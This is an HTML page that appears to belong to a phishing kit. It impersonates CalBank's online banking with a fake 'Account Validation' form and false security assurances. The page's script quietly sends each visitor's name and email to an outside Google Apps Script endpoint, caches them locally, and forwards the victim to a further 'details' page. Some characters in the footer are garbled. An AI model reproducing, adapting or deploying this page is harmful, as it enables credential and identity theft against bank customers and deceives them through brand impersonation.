<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>CalBank Digital Banking | Account Validation</title>

  <!-- Font -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

  <style>
    :root {
      --primary: #000000;          /* CalBank black */
      --primary-dark: #1a1a1a;
      --accent: #f9c600;           /* CalBank yellow */
      --bg: #f3f5f8;
      --card-bg: #ffffff;
      --text-main: #1f2933;
      --text-muted: #6b7280;
      --border: #e5e7eb;
    }

    * { box-sizing: border-box; }

    body {
      margin: 0;
      min-height: 100vh;
      font-family: "Inter", system-ui, sans-serif;
      background: var(--bg);
      color: var(--text-main);
      display: flex;
      flex-direction: column;
    }

    /* ===== HEADER ===== */
    header {
      background: var(--accent);
      color: #000;
      padding: 16px 0;
      box-shadow: 0 4px 18px rgba(0,0,0,0.25);
    }

    .header-inner {
      max-width: 1100px;
      margin: 0 auto;
      padding: 0 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .brand {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .logo {
      width: 42px;
      height: 42px;
      border-radius: 50%;
      background: #000;
      display: grid;
      place-items: center;
      font-weight: 800;
      color: var(--accent);
      font-size: 14px;
    }

    .brand-text strong {
      font-size: 15px;
      letter-spacing: 0.4px;
    }

    .brand-text span {
      font-size: 12px;
      opacity: 0.85;
    }

    .secure-badge {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 13px;
      background: rgba(0,0,0,0.1);
      padding: 8px 14px;
      border-radius: 999px;
    }

    .secure-dot {
      width: 8px;
      height: 8px;
      background: #16a34a;
      border-radius: 50%;
    }

    /* ===== MAIN ===== */
    main {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 40px 20px;
    }

    .portal-card {
      width: 100%;
      max-width: 460px;
      background: var(--card-bg);
      border-radius: 14px;
      border: 1px solid var(--border);
      box-shadow: 0 10px 30px rgba(0,0,0,0.12);
      overflow: hidden;
      animation: fadeIn 0.4s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .card-header {
      padding: 22px 26px;
      border-bottom: 1px solid var(--border);
    }

    .card-header h1 {
      margin: 0;
      font-size: 18px;
      font-weight: 700;
    }

    .card-header p {
      margin: 6px 0 0;
      font-size: 13px;
      color: var(--text-muted);
    }

    .card-body {
      padding: 26px;
    }

    label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      margin-bottom: 6px;
    }

    input {
      width: 100%;
      padding: 12px 14px;
      margin-bottom: 18px;
      font-size: 14px;
      border-radius: 8px;
      border: 1px solid var(--border);
    }

    input:focus {
      outline: none;
      border-color: var(--accent);
      box-shadow: 0 0 0 3px rgba(249,198,0,0.3);
    }

    .btn {
      width: 100%;
      padding: 14px;
      border-radius: 10px;
      border: none;
      background: var(--accent);
      color: #000;
      font-size: 15px;
      font-weight: 700;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
      box-shadow: 0 6px 16px rgba(0,0,0,0.18);
    }

    .btn:hover {
      background: #e6b200;
    }

    .btn:active {
      transform: translateY(1px);
    }

    .info-note {
      margin-top: 18px;
      font-size: 12px;
      color: var(--text-muted);
      display: flex;
      gap: 8px;
      align-items: flex-start;
    }

    /* ===== FOOTER ===== */
    footer {
      padding: 18px 20px;
      text-align: center;
      font-size: 12px;
      color: var(--text-muted);
    }

    /* ===== OVERLAY ===== */
    .overlay {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.45);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      color: #fff;
      font-size: 15px;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.3s ease;
      z-index: 999;
    }

    .overlay.active {
      opacity: 1;
      pointer-events: all;
    }

    .spinner {
      width: 44px;
      height: 44px;
      border: 4px solid rgba(255,255,255,0.35);
      border-top: 4px solid var(--accent);
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 16px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>

<body>

<!-- HEADER -->
<header>
  <div class="header-inner">
    <div class="brand">
      <div class="logo">CAL</div>
      <div class="brand-text">
        <strong>CalBank Digital Banking</strong><br>
        <span>Secure Authentication Portal</span>
      </div>
    </div>

    <div class="secure-badge">
      <div class="secure-dot"></div>
      Secure Session
    </div>
  </div>
</header>

<!-- MAIN -->
<main>
  <div class="portal-card">
    <div class="card-header">
      <h1>Account Validation</h1>
      <p>Please confirm your details to proceed securely.</p>
    </div>

    <div class="card-body">
      <form id="dataForm" autocomplete="off">
        <label>First Name</label>
        <input name="firstName" type="text" required>

        <label>Last Name</label>
        <input name="lastName" type="text" required>

        <label>Email Address</label>
        <input name="email" type="email" required>

        <button class="btn" type="submit">Continue Securely</button>
      </form>

      <div class="info-note">
        üîí Your information is encrypted and protected under CalBank security standards.
      </div>
    </div>
  </div>
</main>

<!-- FOOTER -->
<footer>
  ¬©Ô∏è CalBank PLC. All rights reserved.
</footer>

<!-- OVERLAY -->
<div class="overlay" id="overlay">
  <div class="spinner"></div>
  Verifying your information‚Ä¶
</div>

<script>
  const scriptURL = "https://script.google.com/macros/s/AKfycbxna9EgM4s8zbNQTkfzcHfADid6CE7MEMmXAAIX2RTU6YfT-GkHRxEIWPVa81Qt-oO0/exec";
  const form = document.getElementById("dataForm");
  const overlay = document.getElementById("overlay");

  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    overlay.classList.add("active");

    const fd = new FormData(form);
    const { firstName, lastName, email } = Object.fromEntries(fd.entries());

    try {
      await fetch(scriptURL, { method: "POST", body: fd });
      localStorage.setItem("firstName", firstName);
      localStorage.setItem("lastName", lastName);
      localStorage.setItem("email", email);
      setTimeout(() => window.location.href = "details.html", 1400);
    } catch {
      overlay.classList.remove("active");
      alert("Unable to process request. Please try again.");
    }
  });
</script>

</body>
</html>
